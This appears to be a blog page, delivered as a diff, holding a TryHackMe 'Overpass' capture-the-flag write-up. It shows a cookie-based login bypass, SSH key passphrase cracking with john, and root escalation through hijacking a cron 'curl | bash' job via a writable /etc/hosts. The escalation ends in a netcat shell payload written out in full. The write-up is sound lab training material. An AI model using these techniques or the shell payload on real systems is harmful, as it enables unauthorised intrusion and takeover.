@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <meta content="#ffffff" name="theme-color" />
+  <meta content="#da532c" name="msapplication-TileColor" />
+
+  
+<link rel="canonical" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups/overpass">
+<meta name="description" content="Breaking the password manager.">
+<meta name="keywords" content="overpass, tryhackme, bind shell, linpeas">
+<meta name="robots" content="index, follow">
+
+<meta property="og:title" content="Overpass - TryHackMe Writup">
+<meta property="og:description" content="Breaking the password manager.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups/overpass">
+<meta property="og:image" content="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups/images/avatar.jpg">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Overpass - TryHackMe Writup">
+<meta name="twitter:description" content="Breaking the password manager.">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups/images/avatar.jpg">
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups/overpass"
+    },
+    "headline": "Overpass - TryHackMe Writup",
+    "description": "Breaking the password manager.",
+    "author": {
+      "@type": "Person",
+      "name": "вιѕнαℓυ"
+    },
+    "datePublished": "2024-10-23",
+    "image": "https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups/images/cover.jpg",
+    "publisher": {
+      "@type": "Organization",
+      "name": "Writups",
+      "logo": {
+        "@type": "ImageObject",
+        "url": "https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups/images/human_avatar.jpg"
+      }
+    },
+    "articleBody": "<div style="display: flex; align-items: center;">
+  <div>
+    <img src="overpass.png" alt="overpass" width="100"/>
+  </div>
+  <div style="margin-left: 10px;">
+    <i>What happens when some broke CompSci students make a password manager?</i>
+  </div>
+</div>
+<h2 id="1-enumeration">1. Enumeration</h2>
+<p>Target IP address: 10.10.4.48</p>
+<p>Two ports are open.</p>
+<pre>
+❯ nmap -sV 10.10.4.48 -v
+
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp    open     http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+10628/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre>
+<p>Okay, now starting by searching directories using gobuster as</p>
+<pre>
+❯ gobuster dir -u http://10.10.4.48/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.4.48/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/img                  (Status: 301) [Size: 0] [--> img/]
+/downloads            (Status: 301) [Size: 0] [--> downloads/]
+/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
+/admin                (Status: 301) [Size: 42] [--> /admin/]
+/css                  (Status: 301) [Size: 0] [--> css/]
+......
+</pre>
+<p>We got admin as interesting and there is a login page.
+<img src="https://theanxiuser.github.io/writups/chapters/overpass/admin_login_page.png" alt="alt text" /></p>
+<p>There is client side login logic found in <code>login.js</code>, the main script is </p>
+<pre>
+async function login() {
+    const usernameBox = document.querySelector("#username");
+    const passwordBox = document.querySelector("#password");
+    const loginStatus = document.querySelector("#loginStatus");
+    loginStatus.textContent = ""
+    const creds = { username: usernameBox.value, password: passwordBox.value }
+    const response = await postData("/api/login", creds)
+    const statusOrCookie = await response.text()
+    if (statusOrCookie === "Incorrect credentials") {
+        loginStatus.textContent = "Incorrect Credentials"
+        passwordBox.value=""
+    } else {
+        Cookies.set("SessionToken",statusOrCookie)
+        window.location = "/admin"
+    }
+}
+</pre>
+<p>It seems that, if the value of <code>statusOrCookie</code> is <code>Incorrect Credentials</code>, then the error occurs, otherwise log on. Lets try to tweak the variable <code>statusOrCookie</code>. May be directly hampring this pariable is difficult as this is from backend side. Instead we can set the cookies, as shown in else block to any value.</p>
+<h2 id="2-attacking">2. Attacking</h2>
+<p>Lets try in console, by inspecting the page. Did this and refrest, I got logged in ant there I found RSA private key.</p>
+<p><img src="https://theanxiuser.github.io/writups/chapters/overpass/setting_cookies.png" alt="alt text" /></p>
+<p>The message found there is</p>
+<pre>
+Welcome to the Overpass Administrator area
+A secure password manager with support for Windows, Linux, MacOS and more
+Since you keep forgetting your password, James, I've set up SSH keys for you.
+
+If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
+Also, we really need to talk about this "Military Grade" encryption. - Paradox
+</pre>
+<p>That means we need to crack this key to get ssh password. We can use <code>ssh2john</code>. It converts ssh key into password hash and can be cracked using john. </p>
+<p><code>ssh2john rsa_private_key &gt; password_hash</code>, here rsa_private_key contains the private key found in the admin page after login.</p>
+<pre>
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt password_hash
+.........
+Press 'q' or Ctrl-C to abort, almost any other key for status
+jam****          (rsa_private_key)
+Warning: Only 2 candidates left, minimum 8 needed for performance.
+1g 0:00:00:06 DONE (2024-10-10 08:41) 0.1652g/s 2370Kp/s 2370Kc/s 2370KC/sa6_123..*7¡Vamos!
+Session completed
+</pre>
+<p>Now we have ssh password/passphrase for the user <code>james</code></p>
+<h2 id="3-capture-the-flag">3. Capture the flag</h2>
+<p>Login via ssh and capture the user flag as</p>
+<p><img src="https://theanxiuser.github.io/writups/chapters/overpass/user_flag_poc.png" alt="alt text" /></p>
+<p>Here first, change the permission of the private key to <code>400</code> that means only the owner read the key. After that connect via ssh and provided passphrase to logged in, then found the <code>user.txt</code></p>
+<p>There is todo.txt is found, it is</p>
+<pre>
+james@overpass-prod:~$ cat todo.txt 
+To Do:
+> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
+> Write down my password somewhere on a sticky note so that I don't forget it.
+  Wait, we make a password manager. Why don't I just use that?
+> Test Overpass for macOS, it builds fine but I'm not sure it actually works
+> Ask Paradox how he got the automated build script working and where the builds go.
+  They're not updating on the website
+</pre>
+<h2 id="4-privilege-escalation">4. Privilege escalation</h2>
+<p>There is the mention of automated build script. Maybe this can be helpful, but we need to enumerate first.</p>
+<p>I have downloaded <code>linpeas.sh</code> into my local machine, created http server using python as <code>python -m http.server</code> then download the script in target machine and ran there.</p>
+<p>Importent finding can be <code>/etc/hosts</code> file is writable by every user including we. Also looking into cornjob</p>
+<pre>
+james@overpass-prod:~$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+# Update builds from latest code
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+</pre>
+<p>There is a script running by root, everytime and hosted in overpass.thm domain. So we need to setup payload in such a way that while running this job, our payload will be downloaded and runned so that the victim will be connected to out machine, using bind shell.</p>
+<p>For that need to setup server and path like this in my local device and need to add DNS record in /etc/hosts as shown below</p>
+<p><code>10.17.58.84 overpass.thm</code></p>
+<p>and the payload used in buildscript.sh is </p>
+<p><code>mkfifo /tmp/f; nc -lvnp 4444 &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</code></p>
+<p>Here we go, got root flag too.</p>
+<p><img src="https://theanxiuser.github.io/writups/chapters/overpass/root_flag_poc.png" alt="alt text" /></p>
+<p>Happy Hacking !!</p>
+"
+  }
+  </script>
+   
+
+
+  
+  
+  <link href='&#x2F;icons&#x2F;site.webmanifest' rel="manifest" />
+  
+  
+  <link color="#5bbad5" href='&#x2F;icons&#x2F;safari-pinned-tab.svg' rel="mask-icon" />
+  
+  
+  <link href='&#x2F;icons&#x2F;favicon-16x16.png' rel="icon" sizes="16x16" type="image/png" />
+  
+  
+  <link href='&#x2F;icons&#x2F;favicon-32x32.png' rel="icon" sizes="32x32" type="image/png" />
+  
+  
+  <link href='&#x2F;icons&#x2F;apple-touch-icon.png' rel="apple-touch-icon" sizes="180x180" />
+  
+
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/galleria@1.6.1/dist/themes/folio/galleria.folio.min.css" integrity="sha384-+rY0QD+LRnTOquDMzGa9lXU6jIwdiQuwCJQ2cdcW0qeP/0UbjQCZlXnRsUMA+9pH" crossorigin="anonymous">
+  
+
+  
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/jpswalsh/academicons@1.9.1/css/academicons.min.css" integrity="sha384-FIue+PI4SsI9XfHCz8dBLg33b0c1fMJgNU3X//L26FYbGnlSEfWmNT7zgWc2N9b6" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.2.0/css/all.min.css" integrity="sha256-AbA177XfpSnFEvgpYu1jMygiLabzPCJCRIBtR5jGc0k=" crossorigin="anonymous">
+  <link href="https://theanxiuser.github.io/writups/deep-thought.css" rel="stylesheet" />
+  
+  
+
+  <title>
+    
+Writups | Overpass - TryHackMe Writup
+
+  </title>
+
+  
+  
+  
+
+  
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css" integrity="sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs" crossorigin="anonymous">
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js" integrity="sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx" crossorigin="anonymous"></script>
+
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/mathtex-script-type.min.js" integrity="sha384-jiBVvJ8NGGj5n7kJaiWwWp9AjC+Yh8rhZY3GtAX8yU28azcLgoRo4oukO87g7zDT" crossorigin="anonymous"></script>
+  
+  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js" integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"></script>
+  
+  
+</head>
+
+<body class="has-background-white">
+  <nav aria-label="section navigation" class="navbar is-light" role="navigation">
+    <div class="container">
+      <div class="navbar-brand">
+        <a class="navbar-item is-size-5 has-text-weight-bold" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups">Writups</a>
+        <a aria-expanded="false" aria-label="menu" class="navbar-burger burger" data-target="navMenu" role="button">
+          <span aria-hidden="true"></span>
+          <span aria-hidden="true"></span>
+          <span aria-hidden="true"></span>
+        </a>
+      </div>
+      <div class="navbar-menu" id="navMenu">
+        <div class="navbar-end has-text-centered">
+          
+          
+          
+          <a class="navbar-item has-text-weight-semibold" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;">
+            Home
+          </a>
+          
+          <a class="navbar-item has-text-weight-semibold" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters">
+            Chapters
+          </a>
+          
+          <a class="navbar-item has-text-weight-semibold" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;tags">
+            Tags
+          </a>
+          
+          <a class="navbar-item has-text-weight-semibold" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;categories">
+            Categories
+          </a>
+          
+          
+          
+          <a class="navbar-item" id="nav-search" title="Search" data-target="#search-modal">
+            <span class="icon">
+              <i class="fas fa-search"></i>
+            </span>
+          </a>
+          <a class="navbar-item" id="dark-mode" title="Switch to dark theme">
+            <span class="icon">
+              <i class="fas fa-adjust"></i>
+            </span>
+          </a>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  
+  
+
+  
+<section class="section">
+  <div class="container">
+    <div class="columns">
+      <div class="column is-8 is-offset-2">
+        <article class="box">
+          <h1 class="title">
+            Overpass - TryHackMe Writup
+          </h1>
+          <p class="subtitle">Breaking the password manager.</p>
+          <div class="columns is-multiline is-gapless">
+            <div class="column is-8">
+              
+<span class="icon-text has-text-grey">
+  <span class="icon">
+    <i class="fas fa-user"></i>
+  </span>
+  <span>вιѕнαℓυ published on</span>
+  <span class="icon">
+    <i class="far fa-calendar-alt"></i>
+  </span>
+  <span><time datetime="2024-10-23">October 23, 2024</time></span>
+</span>
+
+            </div>
+            <div class="column is-4 has-text-right-desktop">
+              
+<span class="icon-text has-text-grey">
+  <span class="icon">
+    <i class="far fa-clock"></i>
+  </span>
+  <span>5 min,</span>
+  <span class="icon">
+    <i class="fas fa-pencil-alt"></i>
+  </span>
+  <span>986 words</span>
+</span>
+
+            </div>
+            <div class="column">
+              
+              
+<p>
+  Categories:
+  
+  <a class="has-text-info-dark has-text-weight-semibold" href="https://theanxiuser.github.io/writups/categories/tryhackme/">
+    <span class="icon-text">
+      <span class="icon">
+        <i class="fas fa-cube"></i>
+      </span>
+      <span>TryHackMe</span>
+    </span>
+  </a>
+  
+  <a class="has-text-info-dark has-text-weight-semibold" href="https://theanxiuser.github.io/writups/categories/writups/">
+    <span class="icon-text">
+      <span class="icon">
+        <i class="fas fa-cube"></i>
+      </span>
+      <span>Writups</span>
+    </span>
+  </a>
+  
+</p>
+
+              
+            </div>
+            <div class="column has-text-right-desktop">
+              
+              
+<p>
+  Tags:
+  
+  <a class="has-text-info-dark has-text-weight-semibold" href="https://theanxiuser.github.io/writups/tags/overpass/">
+    <span class="icon-text">
+      <span class="icon">
+        <i class="fas fa-tag"></i>
+      </span>
+      <span>overpass</span>
+    </span>
+  </a>
+  
+  <a class="has-text-info-dark has-text-weight-semibold" href="https://theanxiuser.github.io/writups/tags/tryhackme/">
+    <span class="icon-text">
+      <span class="icon">
+        <i class="fas fa-tag"></i>
+      </span>
+      <span>tryhackme</span>
+    </span>
+  </a>
+  
+  <a class="has-text-info-dark has-text-weight-semibold" href="https://theanxiuser.github.io/writups/tags/bind-shell/">
+    <span class="icon-text">
+      <span class="icon">
+        <i class="fas fa-tag"></i>
+      </span>
+      <span>bind shell</span>
+    </span>
+  </a>
+  
+  <a class="has-text-info-dark has-text-weight-semibold" href="https://theanxiuser.github.io/writups/tags/linpeas/">
+    <span class="icon-text">
+      <span class="icon">
+        <i class="fas fa-tag"></i>
+      </span>
+      <span>linpeas</span>
+    </span>
+  </a>
+  
+</p>
+
+              
+            </div>
+          </div>
+          <div class="content mt-2">
+            <div style="display: flex; align-items: center;">
+  <div>
+    <img src="overpass.png" alt="overpass" width="100"/>
+  </div>
+  <div style="margin-left: 10px;">
+    <i>What happens when some broke CompSci students make a password manager?</i>
+  </div>
+</div>
+<h2 id="1-enumeration">1. Enumeration</h2>
+<p>Target IP address: 10.10.4.48</p>
+<p>Two ports are open.</p>
+<pre>
+❯ nmap -sV 10.10.4.48 -v
+
+PORT      STATE    SERVICE VERSION
+22/tcp    open     ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp    open     http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+10628/tcp filtered unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre>
+<p>Okay, now starting by searching directories using gobuster as</p>
+<pre>
+❯ gobuster dir -u http://10.10.4.48/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.4.48/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/img                  (Status: 301) [Size: 0] [--> img/]
+/downloads            (Status: 301) [Size: 0] [--> downloads/]
+/aboutus              (Status: 301) [Size: 0] [--> aboutus/]
+/admin                (Status: 301) [Size: 42] [--> /admin/]
+/css                  (Status: 301) [Size: 0] [--> css/]
+......
+</pre>
+<p>We got admin as interesting and there is a login page.
+<img src="https://theanxiuser.github.io/writups/chapters/overpass/admin_login_page.png" alt="alt text" /></p>
+<p>There is client side login logic found in <code>login.js</code>, the main script is </p>
+<pre>
+async function login() {
+    const usernameBox = document.querySelector("#username");
+    const passwordBox = document.querySelector("#password");
+    const loginStatus = document.querySelector("#loginStatus");
+    loginStatus.textContent = ""
+    const creds = { username: usernameBox.value, password: passwordBox.value }
+    const response = await postData("/api/login", creds)
+    const statusOrCookie = await response.text()
+    if (statusOrCookie === "Incorrect credentials") {
+        loginStatus.textContent = "Incorrect Credentials"
+        passwordBox.value=""
+    } else {
+        Cookies.set("SessionToken",statusOrCookie)
+        window.location = "/admin"
+    }
+}
+</pre>
+<p>It seems that, if the value of <code>statusOrCookie</code> is <code>Incorrect Credentials</code>, then the error occurs, otherwise log on. Lets try to tweak the variable <code>statusOrCookie</code>. May be directly hampring this pariable is difficult as this is from backend side. Instead we can set the cookies, as shown in else block to any value.</p>
+<h2 id="2-attacking">2. Attacking</h2>
+<p>Lets try in console, by inspecting the page. Did this and refrest, I got logged in ant there I found RSA private key.</p>
+<p><img src="https://theanxiuser.github.io/writups/chapters/overpass/setting_cookies.png" alt="alt text" /></p>
+<p>The message found there is</p>
+<pre>
+Welcome to the Overpass Administrator area
+A secure password manager with support for Windows, Linux, MacOS and more
+Since you keep forgetting your password, James, I've set up SSH keys for you.
+
+If you forget the password for this, crack it yourself. I'm tired of fixing stuff for you.
+Also, we really need to talk about this "Military Grade" encryption. - Paradox
+</pre>
+<p>That means we need to crack this key to get ssh password. We can use <code>ssh2john</code>. It converts ssh key into password hash and can be cracked using john. </p>
+<p><code>ssh2john rsa_private_key &gt; password_hash</code>, here rsa_private_key contains the private key found in the admin page after login.</p>
+<pre>
+❯ john --wordlist=/usr/share/wordlists/rockyou.txt password_hash
+.........
+Press 'q' or Ctrl-C to abort, almost any other key for status
+jam****          (rsa_private_key)
+Warning: Only 2 candidates left, minimum 8 needed for performance.
+1g 0:00:00:06 DONE (2024-10-10 08:41) 0.1652g/s 2370Kp/s 2370Kc/s 2370KC/sa6_123..*7¡Vamos!
+Session completed
+</pre>
+<p>Now we have ssh password/passphrase for the user <code>james</code></p>
+<h2 id="3-capture-the-flag">3. Capture the flag</h2>
+<p>Login via ssh and capture the user flag as</p>
+<p><img src="https://theanxiuser.github.io/writups/chapters/overpass/user_flag_poc.png" alt="alt text" /></p>
+<p>Here first, change the permission of the private key to <code>400</code> that means only the owner read the key. After that connect via ssh and provided passphrase to logged in, then found the <code>user.txt</code></p>
+<p>There is todo.txt is found, it is</p>
+<pre>
+james@overpass-prod:~$ cat todo.txt 
+To Do:
+> Update Overpass' Encryption, Muirland has been complaining that it's not strong enough
+> Write down my password somewhere on a sticky note so that I don't forget it.
+  Wait, we make a password manager. Why don't I just use that?
+> Test Overpass for macOS, it builds fine but I'm not sure it actually works
+> Ask Paradox how he got the automated build script working and where the builds go.
+  They're not updating on the website
+</pre>
+<h2 id="4-privilege-escalation">4. Privilege escalation</h2>
+<p>There is the mention of automated build script. Maybe this can be helpful, but we need to enumerate first.</p>
+<p>I have downloaded <code>linpeas.sh</code> into my local machine, created http server using python as <code>python -m http.server</code> then download the script in target machine and ran there.</p>
+<p>Importent finding can be <code>/etc/hosts</code> file is writable by every user including we. Also looking into cornjob</p>
+<pre>
+james@overpass-prod:~$ cat /etc/crontab 
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+# Update builds from latest code
+* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+</pre>
+<p>There is a script running by root, everytime and hosted in overpass.thm domain. So we need to setup payload in such a way that while running this job, our payload will be downloaded and runned so that the victim will be connected to out machine, using bind shell.</p>
+<p>For that need to setup server and path like this in my local device and need to add DNS record in /etc/hosts as shown below</p>
+<p><code>10.17.58.84 overpass.thm</code></p>
+<p>and the payload used in buildscript.sh is </p>
+<p><code>mkfifo /tmp/f; nc -lvnp 4444 &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</code></p>
+<p>Here we go, got root flag too.</p>
+<p><img src="https://theanxiuser.github.io/writups/chapters/overpass/root_flag_poc.png" alt="alt text" /></p>
+<p>Happy Hacking !!</p>
+
+          </div>
+        </article>
+      </div>
+      
+    </div>
+  </div>
+</section>
+
+
+  
+  <section class="modal" id="search-modal">
+    <div class="modal-background"></div>
+    <div class="modal-card">
+      <header class="modal-card-head">
+        <p class="modal-card-title">Search</p>
+      </header>
+      <section class="modal-card-body">
+        <div class="field mb-2">
+          <div class="control">
+            <input class="input" id="search" placeholder="Search this website." type="search" />
+          </div>
+        </div>
+        <div class="search-results">
+          <div class="search-results__items"></div>
+        </div>
+      </section>
+    </div>
+    <button aria-label="close" class="modal-close is-large"></button>
+  </section>
+  
+
+
+  
+
+<section class="section">
+  <div class="container">
+    <div class="columns is-centered">
+      <div class="column is-8">
+        <nav class="level">
+              
+          <div class="level-item has-text-centered">
+            <a class="button is-black is-outlined" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;agent-sudo&#x2F;">
+              <span class="icon mr-2">
+                <i class="fas fa-arrow-circle-left"></i>
+              </span>
+              Agent Sudo - TryHackMe Writup
+            </a>
+          </div>
+           
+          <div class="level-item has-text-centered">
+            <a class="button is-black is-outlined" href="https:&#x2F;&#x2F;theanxiuser.github.io&#x2F;writups&#x2F;chapters&#x2F;investigating-windows&#x2F;">
+              Investigating Windows - TryHackMe Writup<span class="icon ml-2">
+                <i class="fas fa-arrow-circle-right"></i>
+              </span>
+            </a>
+          </div>
+          
+        </nav>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+
+  
+
+
+
+  
+  <footer class="footer py-4">
+    <div class="content has-text-centered">
+      <p>
+        Built with
+        <span class="icon-text">
+          <span class="icon">
+            <i class="fas fa-code"></i>
+          </span>
+          <span>code</span>
+        </span>
+        and
+        <span class="icon-text">
+          <span class="icon">
+            <i class="fas fa-heart"></i>
+          </span>
+          <span>love</span>
+        </span>
+      </p>
+      <p>
+        Powered by
+        <span class="icon-text">
+          <span class="icon">
+            <i class="fas fa-power-off"></i>
+          </span>
+          <span>zola</span>
+        </span>
+      </p>
+    </div>
+  </footer>
+  
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/galleria@1.6.1/dist/galleria.min.js" integrity="sha384-QSfwGT8/EU536DKdtyP2D6SLlh8zBaZ0cVkwfrwhqzIU9VCfJT00CLVP5t+HAiYg" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/galleria@1.6.1/dist/themes/folio/galleria.folio.min.js" integrity="sha384-DwpKI+deZB267+hPKwiOIc5Y2GKsVL0mR6hgz7GgIu7AgAMYqJwcJKY1YBNfhWcY" crossorigin="anonymous"></script>
+  
+  
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@8.13.5/dist/mermaid.min.js" integrity="sha384-0yWn54pSGtfKCU+skfA69l25VsCw+MZt4LQov3xNRoS7YkAMrFokGgSBnAWSK4pv" crossorigin="anonymous"></script>
+  
+  
+  <script src="https://cdn.jsdelivr.net/npm/chart.xkcd@1.1.13/dist/chart.xkcd.min.js" integrity="sha384-xC3h1+IHXK8seA+8KfT79Z4e0GPsznjXBoMa5nd8ooWKplPyXx92NOmljWxLC/cs" crossorigin="anonymous"></script>
+  
+  
+  <script src="https://theanxiuser.github.io/writups/elasticlunr.min.js"></script>
+  <script src="https://theanxiuser.github.io/writups/search_index.en.js"></script><script src="https://theanxiuser.github.io/writups/js/site.js"></script>
+
+  
+
+
+
+
+
+  
+  
+</body>
+
+</html>
